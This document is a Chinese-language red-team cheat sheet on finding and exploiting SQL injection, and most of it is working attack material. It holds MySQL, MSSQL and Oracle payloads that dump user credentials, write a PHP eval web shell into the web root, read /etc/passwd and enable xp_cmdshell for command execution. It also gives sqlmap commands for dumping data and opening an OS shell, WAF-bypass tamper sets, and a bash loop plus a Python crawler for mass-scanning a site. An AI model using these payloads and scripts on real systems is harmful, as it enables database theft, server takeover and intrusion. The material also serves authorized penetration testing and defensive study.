# SQL注入漏洞挖掘实战方法论

> 📅 2026-06-12 | 🎯 精通 | ⏱ 25 min | 分类：漏洞库与EXP

## 📋 提纲

1. SQL注入类型全景
2. 手工注入速查
3. 自动化挖掘（SQLMap）
4. 绕过技巧
5. 护网中SQL注入挖掘

---

## 1. SQL注入类型全景

| 类型 | 特征 | 利用难度 |
|------|------|---------|
| 联合查询注入 | 有回显，直接UNION SELECT | ⭐ |
| 报错注入 | 无回显但有报错信息 | ⭐⭐ |
| 布尔盲注 | 无回显，用响应差异判断 | ⭐⭐⭐ |
| 时间盲注 | 无任何回显，用延迟判断 | ⭐⭐⭐ |
| 堆叠注入 | 可执行多条SQL | ⭐ |
| 二次注入 | 数据先存储后被调用 | ⭐⭐⭐⭐ |
| DNS外带注入 | 利用DNS请求外传数据 | ⭐⭐ |
| 宽字节注入 | GBK编码下%df吃掉反斜杠 | ⭐⭐ |

---

## 2. 手工注入速查

### 2.1 MySQL 速查

```sql
-- 判断注入点
' AND 1=1-- (正常)
' AND 1=2-- (异常 → 注入点确认)

-- 判断列数
' ORDER BY 3-- (正常)
' ORDER BY 4-- (异常 → 3列)

-- 联合查询
' UNION SELECT 1,2,3--

-- 获取数据库名
' UNION SELECT 1,database(),3--

-- 获取表名
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--

-- 获取列名
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--

-- 获取数据
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--

-- 报错注入
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--

-- 时间盲注
' AND IF(SUBSTRING((SELECT database()),1,1)='a',SLEEP(5),0)--

-- 读写文件
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--
' UNION SELECT 1,2,'<?php @eval($_POST[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'--
```

### 2.2 MSSQL 速查

```sql
-- 判断数据库
' AND @@version=1--

-- 获取表名
' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--

-- 获取列名
' UNION SELECT 1,name,3 FROM syscolumns WHERE id=OBJECT_ID('users')--

-- 堆叠注入
'; EXEC xp_cmdshell('whoami')--

-- 开启xp_cmdshell
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--

-- 报错注入
' AND 1=CONVERT(int,(SELECT @@version))--
```

### 2.3 Oracle 速查

```sql
-- 获取表名
' UNION SELECT table_name,NULL FROM all_tables--

-- 获取列名  
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--

-- 报错注入
' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version))--

-- 时间盲注（Oracle无SLEEP）
' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 1 END FROM dual) IS NOT NULL--
```

---

## 3. SQLMap 自动化

### 3.1 常用命令

```bash
# 基础扫描
sqlmap -u "http://target.com/page.php?id=1" --batch

# 指定数据库
sqlmap -u "http://target.com/page.php?id=1" --dbs

# 获取表
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# 获取列
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns

# 获取数据
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump

# 从文件读请求
sqlmap -r request.txt --batch

# 高等级扫描（更多探测payload）
sqlmap -r request.txt --level=5 --risk=3

# 使用代理（看流量）
sqlmap -r request.txt --proxy=http://127.0.0.1:8080

# 指定注入技术
sqlmap -r request.txt --technique=U  # 只用UNION
sqlmap -r request.txt --technique=B  # 只用Boolean盲注
sqlmap -r request.txt --technique=T  # 只用Time盲注

# Tamper脚本（绕过WAF）
sqlmap -r request.txt --tamper=space2comment,randomcase,between

# OS Shell
sqlmap -r request.txt --os-shell

# 文件读取
sqlmap -r request.txt --file-read="/etc/passwd"
```

### 3.2 Tamper 脚本组合

```bash
# WAF绕过 Tamper 组合
sqlmap -u "http://target.com?id=1" --tamper="space2comment,between,randomcase,charencode,charunicodeencode" --batch

# 常用 tamper:
# space2comment:   空格→/**/
# between:          = → BETWEEN
# randomcase:       随机大小写
# charencode:       字符URL编码
# percentage:       每个字符后加%
# bluecoat:         %00
# versionedmorekeywords: MySQL版本号注释绕过
```

---

## 4. 护网中SQL注入挖掘

### 4.1 批量检测

```bash
#!/bin/bash
# 从Burp Sitemap提取所有GET参数 → 批量SQLMap

# 1. Burp导出URL列表
# 2. 提取含参数的URL
grep -E '\?' urls.txt | sort -u > urls_with_params.txt

# 3. 批量SQLMap（轻量级）
while IFS= read -r url; do
    echo "检测: $url"
    sqlmap -u "$url" --batch --level=1 --risk=1 --smart --threads=5 --timeout=10 2>/dev/null |
        grep -E "parameter.*vulnerable|CRITICAL" &&
        echo "⚠️ $url" >> sqli_found.txt
done < urls_with_params.txt
```

### 4.2 URL采集脚本

```python
#!/usr/bin/env python3
"""从Web页面自动提取所有含参数的URL"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs

def extract_urls_with_params(target, max_depth=2):
    visited = set()
    urls_with_params = set()

    def crawl(url, depth):
        if depth > max_depth or url in visited:
            return
        visited.add(url)

        try:
            resp = requests.get(url, timeout=10, verify=False)

            # 记录当前URL（如果有参数）
            if '?' in url:
                urls_with_params.add(url)

            # 提取页面中的链接和form
            soup = BeautifulSoup(resp.text, 'html.parser')

            # 所有链接
            for link in soup.find_all('a', href=True):
                full_url = urljoin(url, link['href'])
                if target in full_url:
                    crawl(full_url, depth + 1)

            # 所有form的action
            for form in soup.find_all('form', action=True):
                action = urljoin(url, form['action'])
                # 提取form的input参数
                inputs = [inp.get('name','') for inp in form.find_all(['input','select','textarea']) if inp.get('name')]
                if inputs:
                    param_url = f"{action}?{'&'.join(f'{i}=1' for i in inputs)}"
                    urls_with_params.add(param_url)

        except:
            pass

    crawl(target, 0)
    return urls_with_params

# 使用
urls = extract_urls_with_params('https://target.com')
with open('urls_with_params.txt', 'w') as f:
    for url in urls:
        f.write(url + '\n')
```

---

## ✅ SQL注入挖掘 Checklist

- [ ] 所有GET/POST参数枚举
- [ ] Cookie/Header/JSON参数测试
- [ ] 五种注入类型测试
- [ ] SQLMap批量扫描
- [ ] WAF绕过Tamper组合
- [ ] 注入成功→数据获取→横向移动

> 📚 延伸阅读：Penetration/003-SQL注入 | Penetration/007-WAF绕过 | Vuln/001-漏洞概述
